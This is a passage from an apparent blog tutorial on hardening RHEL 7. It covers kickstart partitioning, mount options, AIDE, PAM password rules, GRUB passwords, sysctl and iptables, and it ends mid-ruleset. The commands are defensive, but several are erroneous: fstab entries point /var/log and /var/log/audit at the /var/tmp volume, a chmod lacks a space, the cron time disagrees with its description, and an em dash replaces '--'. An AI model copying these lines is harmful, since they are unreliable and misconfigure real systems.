system for a specific task I recommend creating a duplicate virtual machine you can use for troubleshooting should you run into a issue that you <em>think</em> is related to security hardening, you’ll be able to confirm by running it on the Vanilla system.</p> \n<p>Obviously <strong>don’t expose the Vanilla (un-hardened) system to the network!</strong></p> \n<h2 id=\"why-use-openscap-\">Why use OpenSCAP ?</h2> \n<p>After a lot of research I decided to use OpenSCAP over other security hardening benchmarks / guides, here is my reasoning for doing so:</p> \n<ul> \n <li>It’s open, free and actively worked on</li> \n <li>It has an audit tool, essential to verify each system</li> \n <li>OpenSCAP has a GUI called, workbench</li> \n <li>OpenSCAP Workbench supports remote audits via SSH</li> \n <li>OpenSCAP Workbench allows you to customize your scan, should you not agree with all hardening checks</li> \n</ul> \n<p>If you don’t get on with workbench or auditing from the command line, Nessus has functionality for authenticated SCAP scans.</p> \n<h2 id=\"kickstart\">Kickstart</h2> \n<p>I’ve provided the following RHEL kickstart file below, it’s a minimal install with a heavy partition scheme, allowing for stricter mount options.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"c\">#version=RHEL7</span>\n\n<span class=\"nb\">install</span>\n<span class=\"c\"># System authorization information</span>\nauth <span class=\"nt\">--enableshadow</span> <span class=\"nt\">--passalgo</span><span class=\"o\">=</span>sha512\n\n<span class=\"c\"># Use CDROM installation media</span>\ncdrom\n<span class=\"c\"># Accept EULA</span>\neula <span class=\"nt\">--agreed</span>\n\nservices <span class=\"nt\">--enabled</span><span class=\"o\">=</span>NetworkManager,sshd\nreboot\n\n<span class=\"c\"># Run the Setup Agent on first boot</span>\n<span class=\"c\">#firstboot --enable</span>\nignoredisk <span class=\"nt\">--only-use</span><span class=\"o\">=</span>sda\n<span class=\"c\"># Keyboard layouts</span>\nkeyboard <span class=\"nt\">--vckeymap</span><span class=\"o\">=</span>us <span class=\"nt\">--xlayouts</span><span class=\"o\">=</span><span class=\"s1\">'us'</span>\n<span class=\"c\"># System language</span>\nlang en_US.UTF-8\n<span class=\"c\"># SELinux</span>\nselinux <span class=\"nt\">--enforcing</span>\n<span class=\"c\"># Network information</span>\nnetwork  <span class=\"nt\">--bootproto</span><span class=\"o\">=</span>dhcp <span class=\"nt\">--device</span><span class=\"o\">=</span>eno16777736 <span class=\"nt\">--onboot</span><span class=\"o\">=</span>on <span class=\"nt\">--ipv6</span><span class=\"o\">=</span>off\nnetwork  <span class=\"nt\">--hostname</span><span class=\"o\">=</span>default-vm\n<span class=\"c\"># Root password</span>\nrootpw <span class=\"nt\">--iscrypted</span> HASHGOESHERE\n<span class=\"c\"># System timezone</span>\ntimezone Europe/London <span class=\"nt\">--isUtc</span> <span class=\"nt\">--ntpservers</span><span class=\"o\">=</span>prime.transformers\n<span class=\"c\"># System bootloader configuration</span>\nbootloader <span class=\"nt\">--location</span><span class=\"o\">=</span>mbr <span class=\"nt\">--boot-drive</span><span class=\"o\">=</span>sda\n<span class=\"c\"># Partition clearing information</span>\nclearpart <span class=\"nt\">--all</span> <span class=\"nt\">--drives</span><span class=\"o\">=</span>sda\nignoredisk <span class=\"nt\">--only-use</span><span class=\"o\">=</span>sda\n<span class=\"c\"># LVM</span>\n\n<span class=\"c\"># Disk partitioning information</span>\npart pv.18 <span class=\"nt\">--fstype</span><span class=\"o\">=</span><span class=\"s2\">\"lvmpv\"</span> <span class=\"nt\">--ondisk</span><span class=\"o\">=</span>sda <span class=\"nt\">--size</span><span class=\"o\">=</span>8004\npart pv.11 <span class=\"nt\">--fstype</span><span class=\"o\">=</span><span class=\"s2\">\"lvmpv\"</span> <span class=\"nt\">--ondisk</span><span class=\"o\">=</span>sda <span class=\"nt\">--size</span><span class=\"o\">=</span>8004\npart /boot <span class=\"nt\">--fstype</span><span class=\"o\">=</span><span class=\"s2\">\"ext4\"</span> <span class=\"nt\">--ondisk</span><span class=\"o\">=</span>sda <span class=\"nt\">--size</span><span class=\"o\">=</span>1000\nvolgroup lg_data <span class=\"nt\">--pesize</span><span class=\"o\">=</span>4096 pv.18\nvolgroup lg_os <span class=\"nt\">--pesize</span><span class=\"o\">=</span>4096 pv.11\nlogvol /  <span class=\"nt\">--fstype</span><span class=\"o\">=</span><span class=\"s2\">\"xfs\"</span> <span class=\"nt\">--size</span><span class=\"o\">=</span>4000 <span class=\"nt\">--name</span><span class=\"o\">=</span>lv_root <span class=\"nt\">--vgname</span><span class=\"o\">=</span>lg_os\nlogvol /home  <span class=\"nt\">--fstype</span><span class=\"o\">=</span><span class=\"s2\">\"xfs\"</span> <span class=\"nt\">--size</span><span class=\"o\">=</span>2000 <span class=\"nt\">--name</span><span class=\"o\">=</span>lv_home <span class=\"nt\">--vgname</span><span class=\"o\">=</span>lg_data\nlogvol /tmp  <span class=\"nt\">--fstype</span><span class=\"o\">=</span><span class=\"s2\">\"xfs\"</span> <span class=\"nt\">--size</span><span class=\"o\">=</span>1000 <span class=\"nt\">--name</span><span class=\"o\">=</span>lv_tmp <span class=\"nt\">--vgname</span><span class=\"o\">=</span>lg_os\nlogvol /var  <span class=\"nt\">--fstype</span><span class=\"o\">=</span><span class=\"s2\">\"xfs\"</span> <span class=\"nt\">--size</span><span class=\"o\">=</span>2000 <span class=\"nt\">--name</span><span class=\"o\">=</span>lv_var <span class=\"nt\">--vgname</span><span class=\"o\">=</span>lg_os\nlogvol /var/tmp  <span class=\"nt\">--fstype</span><span class=\"o\">=</span><span class=\"s2\">\"xfs\"</span> <span class=\"nt\">--size</span><span class=\"o\">=</span>1000 <span class=\"nt\">--name</span><span class=\"o\">=</span>lv_var_tmp <span class=\"nt\">--vgname</span><span class=\"o\">=</span>lg_os\nlogvol /var/www  <span class=\"nt\">--fstype</span><span class=\"o\">=</span><span class=\"s2\">\"xfs\"</span> <span class=\"nt\">--size</span><span class=\"o\">=</span>5000 <span class=\"nt\">--name</span><span class=\"o\">=</span>lv_var_www <span class=\"nt\">--vgname</span><span class=\"o\">=</span>lg_data\nlogvol /var/log  <span class=\"nt\">--fstype</span><span class=\"o\">=</span><span class=\"s2\">\"xfs\"</span> <span class=\"nt\">--size</span><span class=\"o\">=</span>1500 <span class=\"nt\">--name</span><span class=\"o\">=</span>lv_var_log <span class=\"nt\">--vgname</span><span class=\"o\">=</span>lg_os\nlogvol /var/log/audit  <span class=\"nt\">--fstype</span><span class=\"o\">=</span><span class=\"s2\">\"xfs\"</span> <span class=\"nt\">--size</span><span class=\"o\">=</span>500 <span class=\"nt\">--name</span><span class=\"o\">=</span>lv_var_log_audit <span class=\"nt\">--vgname</span><span class=\"o\">=</span>lg_os\nlogvol swap  <span class=\"nt\">--fstype</span><span class=\"o\">=</span><span class=\"s2\">\"swap\"</span> <span class=\"nt\">--size</span><span class=\"o\">=</span>1000 <span class=\"nt\">--name</span><span class=\"o\">=</span>lv_swap <span class=\"nt\">--vgname</span><span class=\"o\">=</span>lg_data\n\n%packages\n@core\n %end\n\n%post\n%end</code></pre> \n</figure> \n<h2 id=\"secure-partition-mount-options\">Secure Partition Mount Options</h2> \n<p>Your millage will vary here, for example if you have a website that uses cgi-bin executables you won’t be able to use the <strong>noexec</strong> mount options, but you can and should use it on /tmp and /var/tmp as this is typically the first place an attacker will attempt to write and execute from when performing privilege escalation.</p> \n<p>Your /etc/fstab file should look something like:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"c\">#</span>\n<span class=\"c\"># /etc/fstab</span>\n<span class=\"c\"># Created by anaconda on Sat Oct 11 14:28:47 2014</span>\n<span class=\"c\">#</span>\n<span class=\"c\"># Accessible filesystems, by reference, are maintained under '/dev/disk'</span>\n<span class=\"c\"># See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info</span>\n<span class=\"c\">#</span>\n/dev/mapper/lg_os-lv_root /                       xfs     defaults        1 1\n<span class=\"nv\">UUID</span><span class=\"o\">=</span>d73c5d22-75ed-416e-aad2-8c1bb1dfc713 /boot                   ext4    defaults,nosuid,noexec,nodev        1 2\n/dev/mapper/lg_data-lv_home /home                   xfs     defaults        1 2\n/dev/mapper/lg_os-lv_tmp /tmp                    xfs     defaults,nosuid,noexec,nodev        1 2\n/dev/mapper/lg_os-lv_var /var                    xfs     defaults,nosuid        1 2\n/dev/mapper/lg_os-lv_var_tmp /var/tmp                xfs     defaults,nosuid,noexec,nodev        1 2\n/dev/mapper/lg_os-lv_var_tmp /var/log                xfs     defaults,nosuid,noexec,nodev        1 2\n/dev/mapper/lg_os-lv_var_tmp /var/log/audit                xfs     defaults,nosuid,noexec,nodev        1 2\n/dev/mapper/lg_data-lv_var_www /var/www                xfs     defaults,nosuid,noexec,nodev        1 2\n/dev/mapper/lg_data-lv_swap swap                    swap    defaults        0 0</code></pre> \n</figure> \n<h2 id=\"install-ntp\">Install NTP</h2> \n<p>NTP is required for a number of compliance audits and is general good practice.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">yum <span class=\"nb\">install </span>ntp ntpdate\nchkconfig ntpd on\nntpdate pool.ntp.org\n/etc/init.d/ntpd start</code></pre> \n</figure> \n<h2 id=\"configure-system-for-aide\">Configure System for AIDE</h2> \n<p>Pre-linking binaries (arguably) improved execution time, however this cause issues with AIDE, so it must be disabled.</p> \n<p>Open /etc/sysconfig/prelink and make sure the line <code>Set PRELINKING=no</code> is present, if you’re writing a script:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"c\"># Disable prelinking altogether</span>\n<span class=\"c\">#</span>\n<span class=\"k\">if </span><span class=\"nb\">grep</span> <span class=\"nt\">-q</span> ^PRELINKING /etc/sysconfig/prelink\n<span class=\"k\">then\n  </span><span class=\"nb\">sed</span> <span class=\"nt\">-i</span> <span class=\"s1\">'s/PRELINKING.*/PRELINKING=no/g'</span> /etc/sysconfig/prelink\n<span class=\"k\">else\n  </span><span class=\"nb\">echo</span> <span class=\"nt\">-e</span> <span class=\"s2\">\"</span><span class=\"se\">\\n</span><span class=\"s2\"># Set PRELINKING=no per security requirements\"</span> <span class=\"o\">&gt;&gt;</span> /etc/sysconfig/prelink\n  <span class=\"nb\">echo</span> <span class=\"s2\">\"PRELINKING=no\"</span> <span class=\"o\">&gt;&gt;</span> /etc/sysconfig/prelink\n<span class=\"k\">fi</span></code></pre> \n</figure> \n<p>Disable previous prelink changes to binaries:</p> \n<section class=\"shellbox\"> \n <div class=\"unit golden-large code\"> \n  <p class=\"title\">Disable previous prelink changes to binaries</p> \n  <div class=\"shell\"> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">/usr/sbin/prelink -ua</span> </p> &lt;/p&gt; \n  </div> \n </div> \n</section> \n<h2 id=\"install-aide\">Install AIDE</h2> \n<p>Install AIDE - Advanced Intrusion Detection Environment</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">yum <span class=\"nb\">install </span>aide <span class=\"nt\">-y</span> <span class=\"o\">&amp;&amp;</span> /usr/sbin/aide <span class=\"nt\">--init</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">cp</span> /var/lib/aide/aide.db.new.gz /var/lib/aide/aide.db.gz <span class=\"o\">&amp;&amp;</span> /usr/sbin/aide <span class=\"nt\">--check</span></code></pre> \n</figure> \n<p>Configure periodic execution of AIDE, runs every morning at 04:30</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">echo</span> <span class=\"s2\">\"05 4 * * * root /usr/sbin/aide --check\"</span> <span class=\"o\">&gt;&gt;</span> /etc/crontab</code></pre> \n</figure> \n<h2 id=\"prevent-users-mounting-usb-storage\">Prevent Users Mounting USB Storage</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">echo</span> <span class=\"s2\">\"install usb-storage /bin/false\"</span> <span class=\"o\">&gt;</span> /etc/modprobe.d/usb-storage.conf</code></pre> \n</figure> \n<h2 id=\"enable-secure-high-quality-password-policy\">Enable Secure (high quality) Password Policy</h2> \n<p>The following command will Enable <strong>SHA512</strong> instead of using <em>MD5</em>:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">authconfig <span class=\"nt\">--passalgo</span><span class=\"o\">=</span>sha512 —update</code></pre> \n</figure> \n<p><code>vi /etc/security/pwquality.conf</code></p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"c\"># Configuration for systemwide password quality limits</span>\n<span class=\"c\"># Defaults:</span>\n<span class=\"c\">#</span>\n<span class=\"c\"># Number of characters in the new password that must not be present in the</span>\n<span class=\"c\"># old password.</span>\ndifok <span class=\"o\">=</span> 5\n<span class=\"c\">#</span>\n<span class=\"c\"># Minimum acceptable size for the new password (plus one if</span>\n<span class=\"c\"># credits are not disabled which is the default). (See pam_cracklib manual.)</span>\n<span class=\"c\"># Cannot be set to lower value than 6.</span>\nminlen <span class=\"o\">=</span> 14\n<span class=\"c\">#</span>\n<span class=\"c\"># The maximum credit for having digits in the new password. If less than 0</span>\n<span class=\"c\"># it is the minimum number of digits in the new password.</span>\ndcredit <span class=\"o\">=</span> 1\n<span class=\"c\">#</span>\n<span class=\"c\"># The maximum credit for having uppercase characters in the new password.</span>\n<span class=\"c\"># If less than 0 it is the minimum number of uppercase characters in the new</span>\n<span class=\"c\"># password.</span>\nucredit <span class=\"o\">=</span> 1\n<span class=\"c\">#</span>\n<span class=\"c\"># The maximum credit for having lowercase characters in the new password.</span>\n<span class=\"c\"># If less than 0 it is the minimum number of lowercase characters in the new</span>\n<span class=\"c\"># password.</span>\nlcredit <span class=\"o\">=</span> 1\n<span class=\"c\">#</span>\n<span class=\"c\"># The maximum credit for having other characters in the new password.</span>\n<span class=\"c\"># If less than 0 it is the minimum number of other characters in the new</span>\n<span class=\"c\"># password.</span>\nocredit <span class=\"o\">=</span> 1\n<span class=\"c\">#</span>\n<span class=\"c\"># The minimum number of required classes of characters for the new</span>\n<span class=\"c\"># password (digits, uppercase, lowercase, others).</span>\nminclass <span class=\"o\">=</span> 4\n<span class=\"c\">#</span>\n<span class=\"c\"># The maximum number of allowed consecutive same characters in the new password.</span>\n<span class=\"c\"># The check is disabled if the value is 0.</span>\nmaxrepeat <span class=\"o\">=</span> 3\n<span class=\"c\">#</span>\n<span class=\"c\"># The maximum number of allowed consecutive characters of the same class in the</span>\n<span class=\"c\"># new password.</span>\n<span class=\"c\"># The check is disabled if the value is 0.</span>\nmaxclassrepeat <span class=\"o\">=</span> 3\n<span class=\"c\">#</span>\n<span class=\"c\"># Whether to check for the words from the passwd entry GECOS string of the user.</span>\n<span class=\"c\"># The check is enabled if the value is not 0.</span>\ngecoscheck <span class=\"o\">=</span> 1\n<span class=\"c\">#</span>\n<span class=\"c\"># Path to the cracklib dictionaries. Default is to use the cracklib default.</span>\n<span class=\"c\"># dictpath =</span></code></pre> \n</figure> \n<h2 id=\"secure-etclogindefs-pasword-policy\">Secure /etc/login.defs Pasword Policy</h2> \n<p>Add the following to <code>/etc/login.defs</code></p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">PASS_MIN_LEN 14\nPASS_MIN_DAYS 1\nPASS_MAX_DAYS 60</code></pre> \n</figure> \n<h2 id=\"set-last-logonaccess-notification\">Set Last Logon/Access Notification</h2> \n<p>Open <code>/etc/pam.d/system-auth</code> and add the following line immediately after session required pam_limits.so:</p> \n<p><code>session required pam_lastlog.so showfailed</code></p> \n<h2 id=\"max-password-login-attempts-per-session\">Max Password Login Attempts per Session</h2> \n<p>Set the amount of password reprompts per session, by editing the <code>pam_pwquality.so</code> statement in <code>/etc/pam.d/system-auth</code> to <code>retry=3</code> or lower.</p> \n<h2 id=\"set-deny-for-failed-password-attempts\">Set Deny For Failed Password Attempts</h2> \n<p>Blocks logins for failed authentication on accounts.</p> \n<p>Add the following lines immediately below the <code>pam_unix.so</code> statement in AUTH section of both <code>/etc/pam.d/system-auth</code> and <code>/etc/pam.d/password-auth</code>:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">auth <span class=\"o\">[</span><span class=\"nv\">default</span><span class=\"o\">=</span>die] pam_faillock.so authfail <span class=\"nv\">deny</span><span class=\"o\">=</span>3 <span class=\"nv\">unlock_time</span><span class=\"o\">=</span>604800 <span class=\"nv\">fail_interval</span><span class=\"o\">=</span>900\n\nauth required pam_faillock.so authsucc <span class=\"nv\">deny</span><span class=\"o\">=</span>3 <span class=\"nv\">unlock_time</span><span class=\"o\">=</span>604800 <span class=\"nv\">fail_interval</span><span class=\"o\">=</span>900</code></pre> \n</figure> \n<h2 id=\"limit-password-reuse\">Limit Password Reuse</h2> \n<p>Open /etc/pam.d/system-auth, append remember=24 to the pam_unix.so line - preventing users from reusing passwords, remembering 24 times is the DoD standard.</p> \n<p>The line should look like:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">password sufficient pam_unix.so existing_options <span class=\"nv\">remember</span><span class=\"o\">=</span>24</code></pre> \n</figure> \n<h2 id=\"verify-bootgrub2grubcfg-permissions\">Verify /boot/grub2/grub.cfg Permissions</h2> \n<p>Set grub.conf to chmod 600:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">sudo chmod </span>600/boot/grub2/grub.cfg</code></pre> \n</figure> \n<h2 id=\"set-boot-loader-password\">Set Boot Loader Password</h2> \n<p>The grub2 boot loader should have a superuser account and password protection enabled to protect boot-time settings.</p> \n<p>To do so, select a superuser account and password and add them into the appropriate grub2 configuration file(s) under /etc/grub.d. Since plaintext passwords are a security risk, generate a hash for the pasword by running the following command:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">grub2-mkpasswd-pbkdf2</code></pre> \n</figure> \n<p>When prompted, enter the password that was selected and insert the returned password hash into the appropriate grub2 configuration file(s) under /etc/grub.d immediately after the superuser account. (Use the output from grub2-mkpasswd-pbkdf2 as the value of password-hash):</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">password_pbkdf2 superusers-accountpassword-hash</code></pre> \n</figure> \n<div class=\"note tip\"> \n <h5>Don't use common admin account names for the grub2 superuser</h5> \n <p>Avoid using common admin account names like, root, admin or administrator for the grub2 superuser account. To meet FISMA Moderate, the bootloader superuser account password <b>must differ</b> from the root credentials.</p> \n</div> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">grub2-mkconfig <span class=\"nt\">-o</span> /boot/grub2/grub.cfg</code></pre> \n</figure> \n<div class=\"note warning\"> \n <h5>Don't manually add the superuser account to grub.cfg </h5> \n <p>Do NOT manually add the superuser account and password to the grub.cfg file as the grub2-mkconfig command overwrites this file.</p> \n</div> \n<h2 id=\"require-authentication-for-single-user-mode\">Require Authentication for Single User Mode</h2> \n<p>Require root password when entering single user mode, open <code>/etc/sysconfig/init</code> and add the line:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nv\">SINGLE</span><span class=\"o\">=</span>/sbin/sulogin</code></pre> \n</figure> \n<h2 id=\"disable-ctrl-alt-del-reboot-activation\">Disable Ctrl-Alt-Del Reboot Activation</h2> \n<p>Prevernt ALT+CTRL+DEL from rebooting.</p> \n<p>Open <code>/etc/init/control-alt-delete.conf</code> and modify the existing line:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">exec</span> /sbin/shutdown <span class=\"nt\">-r</span> now <span class=\"s2\">\"Control-Alt-Delete pressed\"</span></code></pre> \n</figure> \n<p>To:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">exec</span> /usr/bin/logger <span class=\"nt\">-p</span> security.info <span class=\"s2\">\"Control-Alt-Delete pressed\"</span></code></pre> \n</figure> \n<h2 id=\"enable-console-screen-locking\">Enable Console Screen Locking</h2> \n<p>Install the screen Package to allow console screen locking.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">sudo </span>yum <span class=\"nb\">install </span>screen</code></pre> \n</figure> \n<p>Users can now run <code>screen</code> and lock the console with <code>ctrl+a x</code>.</p> \n<h2 id=\"disable-zeroconf-networking\">Disable Zeroconf Networking</h2> \n<p>Zeroconf network typically occours when you fail to get an address via DHCP, the interface will be assigned a 169.254.0.0 address.</p> \n<p>To prevernt this:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">echo</span> <span class=\"s2\">\"NOZEROCONF=yes\"</span> <span class=\"o\">&gt;&gt;</span> /etc/sysconfig/network</code></pre> \n</figure> \n<h2 id=\"disable-ipv6-support-automatically-loading\">Disable IPv6 Support Automatically Loading</h2> \n<p>Open <code>/etc/modprobe.d/disabled.conf</code> and add the line:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">options ipv6 <span class=\"nv\">disable</span><span class=\"o\">=</span>1</code></pre> \n</figure> \n<h2 id=\"disable-interface-usage-of-ipv6\">Disable Interface Usage of IPv6</h2> \n<p>Add the following to <code>/etc/sysconfig/network</code></p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nv\">NETWORKING_IPV6</span><span class=\"o\">=</span>no\n<span class=\"nv\">IPV6INIT</span><span class=\"o\">=</span>no</code></pre> \n</figure> \n<h2 id=\"disable-support-for-rpc-ipv6\">Disable Support for RPC IPv6</h2> \n<p>RPC services like NFSv4 attempt to start using IPv6 even if it’s disabled in <code>/etc/modprobe.d</code>. To prevent this behaviour open <code>/etc/netconfig</code> and comment the following lines:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">udp6       tpi_clts      v     inet6    udp     -       -\ntcp6       tpi_cots_ord  v     inet6    tcp     -       -</code></pre> \n</figure> \n<h2 id=\"securing-root-logins\">Securing root Logins</h2> \n<p>Only allow root logins via local terminal:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">echo</span> <span class=\"s2\">\"tty1\"</span> <span class=\"o\">&gt;</span> /etc/securetty\n<span class=\"nb\">chmod </span>700 /root</code></pre> \n</figure> \n<h2 id=\"enable-umask-077\">Enable UMASK 077</h2> \n<p>Can causes issues on systems where users share files:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">perl <span class=\"nt\">-npe</span> <span class=\"s1\">'s/umask\\s+0\\d2/umask 077/g'</span> <span class=\"nt\">-i</span> /etc/bashrc\nperl <span class=\"nt\">-npe</span> <span class=\"s1\">'s/umask\\s+0\\d2/umask 077/g'</span> <span class=\"nt\">-i</span> /etc/csh.cshrc</code></pre> \n</figure> \n<h2 id=\"prune-idle-users\">Prune Idle Users</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">echo</span> <span class=\"s2\">\"Idle users will be removed after 15 minutes\"</span>\n<span class=\"nb\">echo</span> <span class=\"s2\">\"readonly TMOUT=900\"</span> <span class=\"o\">&gt;&gt;</span> /etc/profile.d/os-security.sh\n<span class=\"nb\">echo</span> <span class=\"s2\">\"readonly HISTFILE\"</span> <span class=\"o\">&gt;&gt;</span> /etc/profile.d/os-security.sh\n<span class=\"nb\">chmod</span> +x /etc/profile.d/os-security.sh</code></pre> \n</figure> \n<h2 id=\"securing-cron\">Securing Cron</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">echo</span> <span class=\"s2\">\"Locking down Cron\"</span>\n<span class=\"nb\">touch</span> /etc/cron.allow\n<span class=\"nb\">chmod </span>600 /etc/cron.allow\n<span class=\"nb\">awk</span> <span class=\"nt\">-F</span>: <span class=\"s1\">'{print $1}'</span> /etc/passwd | <span class=\"nb\">grep</span> <span class=\"nt\">-v</span> root <span class=\"o\">&gt;</span> /etc/cron.deny\n<span class=\"nb\">echo</span> <span class=\"s2\">\"Locking down AT\"</span>\n<span class=\"nb\">touch</span> /etc/at.allow\n<span class=\"nb\">chmod </span>600 /etc/at.allow\n<span class=\"nb\">awk</span> <span class=\"nt\">-F</span>: <span class=\"s1\">'{print $1}'</span> /etc/passwd | <span class=\"nb\">grep</span> <span class=\"nt\">-v</span> root <span class=\"o\">&gt;</span> /etc/at.deny</code></pre> \n</figure> \n<h2 id=\"sysctl-security\">Sysctl Security</h2> \n<p><code>/etc/sysctl.conf</code></p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">net.ipv4.ip_forward <span class=\"o\">=</span> 0\nnet.ipv4.conf.all.send_redirects <span class=\"o\">=</span> 0\nnet.ipv4.conf.default.send_redirects <span class=\"o\">=</span> 0\nnet.ipv4.tcp_max_syn_backlog <span class=\"o\">=</span> 1280\nnet.ipv4.icmp_echo_ignore_broadcasts <span class=\"o\">=</span> 1\nnet.ipv4.conf.all.accept_source_route <span class=\"o\">=</span> 0\nnet.ipv4.conf.all.accept_redirects <span class=\"o\">=</span> 0\nnet.ipv4.conf.all.secure_redirects <span class=\"o\">=</span> 0\nnet.ipv4.conf.all.log_martians <span class=\"o\">=</span> 1\nnet.ipv4.conf.default.accept_source_route <span class=\"o\">=</span> 0\nnet.ipv4.conf.default.accept_redirects <span class=\"o\">=</span> 0\nnet.ipv4.conf.default.secure_redirects <span class=\"o\">=</span> 0\nnet.ipv4.icmp_echo_ignore_broadcasts <span class=\"o\">=</span> 1\nnet.ipv4.icmp_ignore_bogus_error_responses <span class=\"o\">=</span> 1\nnet.ipv4.tcp_syncookies <span class=\"o\">=</span> 1\nnet.ipv4.conf.all.rp_filter <span class=\"o\">=</span> 1\nnet.ipv4.conf.default.rp_filter <span class=\"o\">=</span> 1\nnet.ipv4.tcp_timestamps <span class=\"o\">=</span> 0</code></pre> \n</figure> \n<h2 id=\"deny-all-tcp-wrappers\">Deny All TCP Wrappers</h2> \n<p>TCP wrappers can provide a quick and easy method for controlling access to applications linked to them. Examples of TCP Wrapper aware applications are sshd, and portmap.</p> \n<p>Below commands block all but SSH:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">echo</span> <span class=\"s2\">\"ALL:ALL\"</span> <span class=\"o\">&gt;&gt;</span> /etc/hosts.deny\n<span class=\"nb\">echo</span> <span class=\"s2\">\"sshd:ALL\"</span> <span class=\"o\">&gt;&gt;</span> /etc/hosts.allow</code></pre> \n</figure> \n<h2 id=\"basic-iptables-firewall-rules\">Basic iptables Firewall Rules</h2> \n<p>Basic iptables Firewall rules, set to denyall as the default.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"c\">#Drop anything we aren't explicitly allowing. All outbound traffic is okay</span>\n<span class=\"k\">*</span>filter\n:INPUT DROP <span class=\"o\">[</span>0:0]\n:FORWARD DROP <span class=\"o\">[</span>0:0]\n:OUTPUT ACCEPT <span class=\"o\">[</span>0:0]\n:RH-Firewall-1-INPUT - <span class=\"o\">[</span>0:0]\n<span class=\"nt\">-A</span> INPUT <span class=\"nt\">-j</span> RH-Firewall-1-INPUT\n<span class=\"nt\">-A</span> FORWARD <span class=\"nt\">-j</span> RH-Firewall-1-INPUT\n<span class=\"nt\">-A</span> RH-Firewall-1-INPUT <span class=\"nt\">-i</span> lo <span class=\"nt\">-j</span> ACCEPT\n<span class=\"nt\">-A</span> RH-Firewall-1-INPUT <span class=\"nt\">-p</span> icmp <span class=\"nt\">--icmp-type</span> echo-reply <span class=\"nt\">-j</span> ACCEPT\n<span class=\"nt\">-A</span> RH-Firewall-1-INPUT <span class=\"nt\">-p</span> icmp <span class=\"nt\">--icmp-type</span> destination-unreachable <span class=\"nt\">-j</span> ACCEPT\n<span class=\"nt\">-A</span> RH-Firewall-1-INPUT <span class=\"nt\">-p</span> icmp <span class=\"nt\">--icmp-type</span> time-exceeded <span class=\"nt\">-j</span> ACCEPT\n<span class=\"c\"># Accept Pings</span>\n<span class=\"nt\">-A</span> RH-Firewall-1-INPUT <span class=\"nt\">-p</span> icmp <span class=\"nt\">--icmp-type</span> echo-request <span class=\"nt\">-j</span> ACCEPT\n<span class=\"c\"># Log anything on eth0 claiming it's from a local or non-routable network</span>\n<span class=\"c\"># If you're using one of these local networks, remove it from the list below</span>\n<span class=\"nt\">-A</span> INPUT <span class=\"nt\">-i</span> eth0 <span class=\"nt\">-s</span> 10.0.0.0/8 <span class=\"nt\">-j</span> LOG <span class=\"nt\">--log-prefix</span> <span class=\"s2\">\"IP DROP SPOOF A: \"</span>\n<span class=\"nt\">-A</span> INPUT <span class=\"nt\">-i</span> eth0 <span class=\"nt\">-s</span> 172.16.0.0/12 <span class=\"nt\">-j</span> LOG <span class=\"nt\">--log-prefix</span> <span class=\"s2\">\"IP DROP SPOOF B: \"</span>\n<span class=\"nt\">-A</span> INPUT <span class=\"nt\">-i</span> eth0 <span class=\"nt\">-s</span> 192.168.0.0/16 <span class=\"nt\">-j</span> LOG <span class=\"nt\">--log-prefix</span> <span class=\"s2\">\"IP DROP SPOOF C: \"</span>\n<span class=\"nt\">-A</span> INPUT <span class=\"nt\">-i</span> eth0 <span class=\"nt\">-s</span> 224.0.0.0/4 <span class=\"nt\">-j</span> LOG <span class=\"nt\">--log-prefix</span> <span class=\"s2\">\"IP DROP MULTICAST D: \"</span>\n<span class=\"nt\">-A</span> INPUT <span class=\"nt\">-i</span> eth0 <span 